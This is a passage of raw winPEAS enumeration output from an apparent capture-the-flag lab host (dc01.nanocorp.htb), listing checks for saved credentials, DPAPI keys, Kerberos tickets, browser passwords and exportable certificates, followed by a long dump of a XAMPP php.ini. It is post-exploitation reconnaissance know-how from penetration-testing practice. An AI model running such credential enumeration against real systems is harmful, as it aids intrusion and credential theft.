È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault                                                                                                                 
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run: 
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings                                                                                              
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager                                                          
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    serverName: HTTP/dc01.nanocorp.htb
    RealmName: NANOCORP.HTB
    StartTime: 11/12/2025 6:32:39 PM
    EndTime: 11/12/2025 10:32:39 PM
    RenewTime: 12/31/1600 4:00:00 PM
    EncryptionType: aes256_cts_hmac_sha1_96
    TicketFlags: name_canonicalize, ok_as_delegate, pre_authent, renewable
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                                                                                                      
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006000000000000000610000000000000058000000000000005800000008000800580000000000000061000000058a80a20a007c4f0000000f3f44823e2b110d236c1222f2f751e86e440043003000310000                                                                                        


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password.                                                         
                                                                                                                   
   --- End of inner exception stack trace ---                                                                      
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                      
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                          
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                          
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50
                                                                                                                   
    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                               
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                                   
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-2261381271-1331810270-697239744-1103
   =================================================================================================

    SID: S-1-5-21-2261381271-1331810270-697239744-3101
   =================================================================================================

    SID: S-1-5-21-2261381271-1331810270-697239744-500
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
                                                                                                                   

ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
                                                                                                                   

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
                                                                                                                   
  Issuer             : CN=dc01.nanocorp.htb
  Subject            : CN=dc01.nanocorp.htb
  ValidDate          : 4/6/2025 3:58:43 PM
  ExpiryDate         : 4/6/2026 4:18:43 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 4674631227CEE78391B7EC001746F114D6694EA0

  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
                                                                                                                   
  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                   
     C:\Users\All Users\ntuser.pol
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)
                                                                                                                   
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\monitoring_svc\Downloads\winPEASx64.exe": monitoring_svc [AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe
    C:\Windows\System32\wsl.exe

    WSL - no installed Linux distributions found.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ File Analysis ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found MySQL Files
Folder: C:\xampp\licenses\mysql
Folder: C:\xampp\mysql
Folder: C:\xampp\php\data\phpdocref\mysql
Folder: C:\xampp\licenses\strawberry\licenses\mysql
Folder: C:\xampp\licenses\mysql

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Apache-Nginx Files
File: C:\xampp\php\php.ini
; PHP's initialization file, generally called php.ini, is responsible for

; configuring many of the aspects of PHP's behavior.

; PHP attempts to find and load this configuration from a number of locations.

; 1. SAPI module specific location.

; 2. The PHPRC environment variable.

; 3. A number of predefined registry keys on Windows

; 6. The directory from the --with-config-file-path compile time option, or the

; See the PHP docs for more specific information.

; https://php.net/configuration.file

; beginning with a semicolon are silently ignored (as you probably guessed).

; Section headers (e.g. [Foo]) are also silently ignored, even though

; Directives following the section heading [PATH=/www/mysite] only

; following the section heading [HOST=www.example.com] only apply to

; special sections cannot be overridden by user-defined INI files or

; at runtime. Currently, [PATH=] and [HOST=] sections only work under

; https://php.net/ini.sections

; Directives are variables used to configure PHP or PHP extensions.

; There is no name validation.  If PHP can't find an expected

; The value can be a string, a number, a PHP constant (e.g. E_ALL or M_PI), one

; of the INI constants (On, Off, True, False, Yes, No and None) or an expression

; Expressions in the INI file are limited to bitwise operators and parentheses:

; Boolean flags can be turned on using the values 1, On, True or Yes.

; sign, or by using the None keyword:

; foo = None    ; sets foo to an empty string

; foo = "None"  ; sets foo to the string 'None'

; If you use constants in your value, and these constants belong to a

; dynamically loaded extension (either a PHP extension or a Zend extension),

; you may only use these constants *after* the line that loads the extension.

; PHP comes packaged with two INI files. One that is recommended to be used

; in production environments and one that is recommended to be used in

; development environments.

; php.ini-production contains settings which hold security, performance and

; compatibility with older or less security conscience applications. We

; recommending using the production ini in production and testing environments.

; php.ini-development is very similar to its production variant, except it is

; development version only in development environments, as errors shown to

; application users can inadvertently leak otherwise secure information.

; The following are all the settings which are different in either the production

; or development versions of the INIs with respect to PHP's default behavior.

;   Default Value: On

;   Development Value: On

;   Production Value: Off

;   Default Value: On

;   Development Value: On

;   Production Value: Off

;   Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT

;   Development Value: On

;   Production Value: On

;   Development Value: 60 (60 seconds)

;   Production Value: 60 (60 seconds)

;   Production Value: 4096

;   Default Value: On

;   Production Value: Off

;   Default Value: None

;   Production Value: "GP"

; session.gc_divisor

;   Production Value: 1000

; session.sid_bits_per_character

;   Production Value: 5

;   Default Value: On

;   Production Value: Off

;   Production Value: "GPCS"

; zend.exception_ignore_args

;   Production Value: On

; zend.exception_string_param_max_len

;   Production Value: 0

; php.ini Options  ;

; To disable this feature set this option to an empty value

; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)

; Language Options ;

engine=On

; documents, however this remains supported for backward compatibility reasons.

; Note that this directive does not control the <?= shorthand tag, which can be

; Default Value: On

; Production Value: Off

; https://php.net/precision

precision=14

; Output buffering is a mechanism for controlling how much output data

; data to the client. If your application's output exceeds this setting, PHP

; Turning on this setting and managing its maximum buffer size can yield some

; interesting side-effects depending on your application and web server.

; as it gets it. On production servers, 4096 bytes is a good setting for performance

; reasons.

; Note: Output buffering can also be controlled via Output Buffering Control

;   functions.

;   On = Enabled and buffer is unlimited. (Use with caution)

; Production Value: 4096

; You can redirect all of the output of your scripts to a function.  For

; encoding will be transparently converted to the specified encoding.

; Setting any output handler automatically turns on output buffering.

; Note: People who wrote portable scripts should not depend on this ini

; Note: You cannot use both "mb_output_handler" with "ob_iconv_handler"

;   and you cannot use both "ob_gzhandler" and "zlib.output_compression".

; Note: output_handler must be empty if this is set 'On' !!!!

; URL rewriter function rewrites URL on the fly by using

; output buffer. You can set target tags by this configuration.

; Refer to session.trans_sid_tags for usage.

; Production Value: "form="

; Refer to session.trans_sid_hosts for more details.

; Production Value: ""

; Transparent output compression using the zlib library

; Valid values for this option are 'off', 'on', or a specific buffer size

; to be used for compression (default is 4KB)

; Note: Resulting chunk size may vary due to nature of compression. PHP

;   compression. If you prefer a larger chunk size for better

;   performance, enable output_buffering in addition.

; https://php.net/zlib.output-compression

zlib.output_compression=Off

; https://php.net/zlib.output-compression-level

;zlib.output_compression_level = -1

; You cannot specify additional output handlers if zlib.output_compression

; PHP function flush() after each and every call to print() or echo() and each

; and every HTML block.  Turning this option on has serious performance

; implications and is generally recommended for debugging purposes only.

; Note: This directive is hardcoded to On for the CLI SAPI

; The unserialize callback function will be called (with the undefined class'

; which should be instantiated. A warning appears if the specified function is

; not defined, or if the function doesn't include/implement the missing class.

; So only set this entry, if you really want to implement such a

; callback-function.

; during unserialization. The unserialize_max_depth ini setting can be

; overridden by the max_depth option on individual unserialize() calls.

; When floats & doubles are serialized, store serialize_precision significant

; The value is also used for json_encode when encoding double values.

; precision.

serialize_precision=-1

; open_basedir, if set, limits all file operations to the defined directory

; or per-virtualhost web server configuration file.

; This directive allows you to disable certain functions.

; It receives a comma-delimited list of function names.

; https://php.net/disable-functions

disable_functions=

; the request. Consider enabling it if executing long requests, which may end up

;ignore_user_abort = On

; be increased on systems where PHP opens many files to reflect the quantity of

; the file operations performed.

; Duration of time, in seconds for which to cache realpath information for a given

; file or directory. For systems with rarely changing files, consider increasing this

zend.enable_gc=On

; encodings.  To use this feature, mbstring extension must be enabled.

; Only affects if zend.multibyte is set.

; Allows to include or exclude arguments from stack traces generated for exceptions.

; In production, it is recommended to turn this setting on to prohibit the output

; of sensitive information in stack traces

; Production Value: On

zend.exception_ignore_args=Off

; This has no effect when zend.exception_ignore_args is enabled.

; Production Value: 0

zend.exception_string_param_max_len=15

; Decides whether PHP may expose the fact that it is installed on the server

; on your server or not.

expose_php=On

; Maximum execution time of each script, in seconds

; https://php.net/max-execution-time

max_execution_time=120

; idea to limit this time on productions servers in order to eliminate unexpectedly

; long running scripts.

; Development Value: 60 (60 seconds)

; Production Value: 60 (60 seconds)

; Maximum amount of memory a script may consume

; it to take action for. The recommended way of setting values for this

; directive is through the use of the error level constants and bitwise

; operators. The error level constants are below here for convenience as well as

; some common settings and their meanings.

; By default, PHP is set to take action on all errors, notices and warnings EXCEPT

; recommended coding standards in PHP. For performance reasons, this is the

; recommend error reporting setting. Your production server shouldn't be wasting

; Error Level Constants:

; E_WARNING         - run-time warnings (non-fatal errors)

;                     intentional (e.g., using an uninitialized variable and

;                     relying on the fact it is automatically initialized to an

; E_CORE_WARNING    - warnings (non-fatal errors) that occur during PHP's

; E_COMPILE_WARNING - compile-time warnings (non-fatal errors)

; E_DEPRECATED      - warn about code that will not work in future versions

; E_USER_DEPRECATED - user-generated deprecation warnings

; Common Values:

;   E_COMPILE_ERROR|E_RECOVERABLE_ERROR|E_ERROR|E_CORE_ERROR  (Show only errors)

; Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT

; This directive controls whether or not and where PHP will output errors,

; it could be very dangerous in production environments. Depending on the code

; which is triggering the error, sensitive information could potentially leak

; out of your application such as database usernames and passwords or worse.

; For production environments, we recommend logging errors rather than

;   stderr = Display errors to STDERR (affects only CGI/CLI binaries!)

;   On or stdout = Display errors to STDOUT

; Default Value: On

; Development Value: On

; Production Value: Off

display_errors=On

; separately from display_errors. We strongly recommend you set this to 'off'

; for production servers to avoid leaking configuration details.

; Default Value: On

; Development Value: On

; Production Value: Off

display_startup_errors=On

; Besides displaying errors, PHP can also log errors to locations such as a

; server-specific log, STDERR, or a location specified by the error_log

; directive found below. While errors should not be displayed on productions

; servers they should still be monitored and logging is a great way to do that.

; Development Value: On

; Production Value: On

log_errors=On

; Do not log repeated messages. Repeated errors must occur in same file on same

; is On you will not log errors with repeated messages from different files or

; If this parameter is set to Off, then memory leaks will not be shown (on

; stdout or in the log). This is only effective in a debug compile, and if

report_memleaks=On

; error message as HTML for easier reading. This directive controls whether

;html_errors = On

; If html_errors is set to On *and* docref_root is not empty, then PHP

; or function causing the error in detail.

; leading '/'. You must also specify the file extension being used including

; case no links to documentation are generated.

; Note: Never use this feature for production boxes.

; Log errors to syslog (Event Log on Windows).

; to syslog. Only used when error_log is set to syslog.

; the message. Only used when error_log is set to syslog.

; Set this to disable filtering control characters (the default).

; Some loggers only accept NVT-ASCII, others accept anything that's not

; control characters. If your logger accepts everything, then no filtering

;   no-ctrl (all characters except control characters)

; Production value: 0

; NOTE: Every character in this directive is considered as separator!

; starts up. G,P,C,E & S are abbreviations for the following respective super

; paid for the registration of these arrays and because ENV is not as commonly

; used as the others, ENV is not recommended on productions servers. You

; can still get access to the environment variables through getenv() should you

; Production Value: "GPCS";

; EXCEPT one. Leaving this value empty will cause PHP to use the value set

; Default Value: None

; Production Value: "GP"

; runs. $argv contains an array of all the arguments passed to PHP when a script

; is invoked. $argc contains an integer representing the number of arguments

; enabled, registering these variables consumes CPU cycles and memory each time

; a script is executed. For performance reasons, this feature should be disabled

; on production servers.

; Note: This directive is hardcoded to On for the CLI SAPI

; Default Value: On

; Production Value: Off

; variables are not used within a script, having this directive on will result

auto_globals_jit=On

; This option is enabled by default.

; Most likely, you won't want to disable this option globally. It causes $_POST

; and $_FILES to always be empty; the only way you will be able to read the

; to proxy requests or to process the POST data in a memory efficient fashion.

; By default, PHP will output a media type using the Content-Type header. To

; The root of the PHP pages, used only if nonempty.

; see documentation for security issues.  The alternate is to use the

; cgi.force_redirect configuration below

; The directory under which PHP opens the script using /~username used only

; if nonempty.

; Directory in which the loadable extensions (modules) reside.

; https://php.net/extension-dir

;extension_dir = "./"

; On windows:

extension_dir="C:\xampp\php\ext"

; Whether or not to enable the dl() function.  The dl() function does NOT work

; disabled on them.

; most web servers.  Left undefined, PHP turns this on by default.  You can

; if cgi.force_redirect is turned on, and you are not running under Apache or Netscape

; (iPlanet) web servers, you MAY need to set an environment variable name that PHP

; will look for to know it is OK to continue execution.  Setting this variable MAY

; what PATH_INFO is.  For more information on PATH_INFO, see the cgi specs.  Setting

; this to 1 will cause PHP CGI to fix its paths to conform to the spec.  A setting

; FastCGI under IIS supports the ability to impersonate

; security context that the request runs under.  mod_fastcgi under Apache

; https://php.net/fastcgi.impersonate

;fastcgi.impersonate = 1

; Disable logging through FastCGI connection. PHP's default behavior is to enable

; cgi.rfc2616_headers configuration option tells PHP what type of headers to

; use when sending HTTP response code. If set to 0, PHP sends Status: header that

; is supported by Apache. When this option is set to 1, PHP will send

; cgi.check_shebang_line controls whether CGI PHP checks for line starting with #!

; script support running both as stand-alone script and via PHP CGI<. PHP in CGI

; mode skips this line and ignores its content if this directive is turned on.

file_uploads=On

allow_url_fopen=On

; Define the anonymous ftp password (your email address). PHP's default setting

; Default timeout for socket based streams (seconds)

; or you are running on a Mac and need to deal with files from

; Dynamic Extensions ;

; If you wish to have an extension loaded automatically, use the following

;   extension=modulename

;   extension=mysqli

; When the extension library to load is not located in the default extension

;   extension=/path/to/extension/mysqli.so

; Note : The syntax used in previous PHP versions ('extension=<ext>.so' and

; 'extension='php_<ext>.dll') is supported for legacy reasons and may be

; deprecated in a future PHP major version. So, when it is possible, please

; move to the new ('extension=<ext>) syntax.

; Notes for Windows environments :

;   extension folders as well as the separate PECL DLL download.

;   Be sure to appropriately set the extension_dir directive.

extension=bz2

; The ldap extension must be before curl if OpenSSL 1.0.2 and OpenLDAP is used

;extension=ldap

extension=curl

;extension=ffi

;extension=ftp

extension=fileinfo

;extension=gd

extension=gettext

;extension=gmp

;extension=intl

;extension=imap

extension=mbstring

extension=exif      ; Must be after mbstring as it depends on it

extension=mysqli

;extension=oci8_12c  ; Use with Oracle Database 12c Instant Client

;extension=oci8_19  ; Use with Oracle Database 19 Instant Client

;extension=odbc

;extension=openssl

;extension=pdo_firebird

extension=pdo_mysql

;extension=pdo_oci

;extension=pdo_odbc

;extension=pdo_pgsql

extension=pdo_sqlite

;extension=pgsql

;extension=shmop

; The MIBS data available in the PHP distribution must be installed.

; See https://www.php.net/manual/en/snmp.installation.php

;extension=snmp

;extension=soap

;extension=sockets

;extension=sodium

;extension=sqlite3

;extension=tidy

;extension=xsl

;extension=zip

;zend_extension=opcache

display_startup_errors=On

y2k_compliance=On

register_long_arrays=Off

extension=php_openssl.dll

extension=php_ftp.dll

cli_server.color=On

; Defines the default timezone used by the date functions

; https://php.net/date.timezone

;date.timezone =

; https://php.net/date.default-longitude

;date.default_longitude = 35.2333

[iconv]

; If empty, default_charset or input_encoding or iconv.input_encoding is used.

; The precedence is: default_charset < input_encoding < iconv.input_encoding

;iconv.input_encoding =

; If empty, default_charset or internal_encoding or iconv.internal_encoding is used.

; The precedence is: default_charset < internal_encoding < iconv.internal_encoding

;iconv.internal_encoding =

; If empty, default_charset or output_encoding or iconv.output_encoding is used.

; The precedence is: default_charset < output_encoding < iconv.output_encoding

; To use an output encoding conversion, iconv's output handler must be set

; otherwise output encoding conversion cannot be performed.

;iconv.output_encoding =

; passing them to rsh/ssh command, thus passing untrusted data to this function

; happens within intl functions. The value is the level of the error produced.

;intl.use_exceptions = 0

; Directory pointing to SQLite3 extensions

; https://php.net/sqlite3.extension-dir

;sqlite3.extension_dir =

; SQLite defensive mode flag (only available from SQLite 3.26+)

; https://www.sqlite.org/c3ref/c_dbconfig_defensive.html

; (for older SQLite versions, this flag has no use)

; PCRE library recursion limit.

; Please note that if you set this value to a high number you may consume all

; https://php.net/pcre.recursion-limit

;pcre.recursion_limit=100000

; Enables or disables JIT compilation of patterns. This requires the PCRE

; Whether to pool ODBC connections. Can be one of "strict", "relaxed" or "off"

; https://php.net/pdo-odbc.connection-pooling

;pdo_odbc.connection_pooling=strict

; Default socket name for local MySQL connects.  If empty, uses the built-in

; https://php.net/phar.readonly

;phar.readonly = On

;phar.require_hash = On

[mail function]

; For Win32 only.

; For Win32 only.

; For Unix only.  You may supply arguments as well (default: "sendmail -t -i").

; Force the addition of the specified parameters to be passed as extra parameters

; RFC 2822 non conformant MTA.

; Log mail to syslog (Event Log on Windows).

; Controls the ODBC cursor model.

odbc.allow_persistent=On

; Check that a connection is still valid before reuse.

odbc.check_persistent=On

; Maximum number of links (persistent + non-persistent).  -1 means no limit.

; Handling of LONG fields.  Returns number of bytes to variables.  0 means

; Handling of binary data.  0 means passthru, 1 return as is, 2 convert to char.

; See the documentation on odbc_binmode and odbc_longreadlen for an explanation

;mysqli.allow_local_infile = On

mysqli.allow_persistent=On

; Default port number for mysqli_connect().  If unset, mysqli_connect() will use

; compile-time value defined MYSQL_PORT (in that order).  Win32 will only look

; Default socket name for local MySQL connects.  If empty, uses the built-in

; Default host for mysqli_connect() (doesn't apply in safe mode).

; Default user for mysqli_connect() (doesn't apply in safe mode).

; Default password for mysqli_connect() (doesn't apply in safe mode).

; If this option is enabled, closing a persistent connection will rollback

; any pending transactions of this connection, before it is put back

; into the persistent connection pool.

;mysqli.rollback_on_cached_plink = Off

; Enable / Disable collection of general statistics by mysqlnd which can be

; used to tune and monitor MySQL operations.

mysqlnd.collect_statistics=On

; Enable / Disable collection of memory usage statistics by mysqlnd which can be

; used to tune and monitor MySQL operations.

mysqlnd.collect_memory_statistics=On

; Records communication from all extensions using mysqlnd to the specified log

; Timeout for network requests in seconds.

; SHA-256 Authentication Plugin related. File with the MySQL server public RSA

; Connection: Enables privileged connections using external

; https://php.net/oci8.privileged-connect

;oci8.privileged_connect = Off

; Connection: The maximum number of persistent OCI8 connections per

; Connection: The maximum number of seconds a process is allowed to

; maintain an idle persistent connection. Using -1 means idle

; persistent connections will be maintained forever.

; Connection: The number of seconds that must pass before issuing a

; ping during oci_pconnect() to check the connection validity. When

; set to 0, each oci_pconnect() will cause a ping. Using -1 disables

; Connection: Set this to a user chosen connection class to be used

; Connection Pooling (DRCP).  To use DRCP, this value should be set to

; the same string for all web servers running the same application,

; the database pool must be configured, and the connection string must

;oci8.connection_class =

; High Availability: Using On lets PHP receive Fast Application

; Notification (FAN) events generated when a database node fails. The

; database must also be configured to post FAN events.

; Tuning: This option enables statement caching, and specifies how

; rows that will be fetched automatically after statement execution.

; Compatibility. Using On means oci_close() will not close

; oci_connect() and oci_new_connect() connections.

pgsql.allow_persistent=On

; Detect broken persistent links always with pg_pconnect().

; Maximum number of links (persistent+non persistent).  -1 means no limit.

; Number of decimal digits for all bcmath functions.

[Session]

; https://php.net/session.save-handler

session.save_handler=files

; variable in order to use PHP's session functions.

;     session.save_path = "N;/path"

; where N is an integer.  Instead of storing all the session files in

; store the session data in those directories.  This is useful if

; your OS has problems with many files in one directory, and is

; a more efficient layout for servers that handle many sessions.

;         You can use the script in the ext/session dir for that purpose.

; NOTE 2: See the section on garbage collection below if you choose to

;         use subdirectories for session storage

;     session.save_path = "N;MODE;/path"

; where MODE is the octal representation of the mode. Note that this

; https://php.net/session.save-path

session.save_path="C:\xampp\tmp"

; Whether to use strict session mode.

; Strict session mode does not accept an uninitialized session ID, and

; regenerates the session ID if the browser sends an uninitialized session ID.

; Strict mode protects applications from session fixation via a session adoption

; https://wiki.php.net/rfc/strict_sessions

session.use_strict_mode=0

; https://php.net/session.use-cookies

session.use_cookies=1

; https://php.net/session.cookie-secure

;session.cookie_secure =

; This option forces PHP to fetch and use a cookie for storing and maintaining

; the session id. We encourage this operation as it's very helpful in combating

; session hijacking when not specifying and managing your own session id. It is

; not the be-all and end-all of session hijacking defense, but it's a good start.

; https://php.net/session.use-only-cookies

session.use_only_cookies=1

; Name of the session (used as cookie name).

; https://php.net/session.name

session.name=PHPSESSID

; Initialize session on request startup.

; https://php.net/session.auto-start

session.auto_start=0

; Lifetime in seconds of cookie or, if 0, until browser is restarted.

; https://php.net/session.cookie-lifetime

session.cookie_lifetime=0

; https://php.net/session.cookie-path

session.cookie_path=/

; https://php.net/session.cookie-domain

session.cookie_domain=

; Whether or not to add the httpOnly flag to the cookie, which makes it

; https://php.net/session.cookie-httponly

session.cookie_httponly=

; Current valid values are "Strict", "Lax" or "None". When using "None",

; make sure to include the quotes, as `none` is interpreted like `false` in ini files.

session.cookie_samesite=

; https://php.net/session.serialize-handler

session.serialize_handler=php

; Defines the probability that the 'garbage collection' process is started on every

; session initialization. The probability is calculated by using gc_probability/gc_divisor,

; e.g. 1/100 means there is a 1% chance that the GC process starts on each request.

; Production Value: 1

; https://php.net/session.gc-probability

session.gc_probability=1

; Defines the probability that the 'garbage collection' process is started on every

; session initialization. The probability is calculated by using gc_probability/gc_divisor,

; e.g. 1/100 means there is a 1% chance that the GC process starts on each request.

; For high volume production servers, using a value of 1000 is a more efficient approach.

; Production Value: 1000

; https://php.net/session.gc-divisor

session.gc_divisor=1000

; After this number of seconds, stored data will be seen as 'garbage' and

